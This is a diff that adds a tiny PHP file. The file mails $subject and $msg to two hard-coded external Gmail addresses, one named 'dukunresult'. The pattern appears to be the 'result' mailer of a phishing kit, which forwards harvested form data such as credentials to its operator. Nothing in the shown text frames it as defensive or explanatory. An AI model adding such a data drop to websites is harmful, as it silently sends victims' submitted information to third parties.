@@ -1,0 +1,4 @@
+<?php
+$so = "equallib12@gmail.com,dukunresult@gmail.com";
+mail($so,$subject,$msg);
+?>
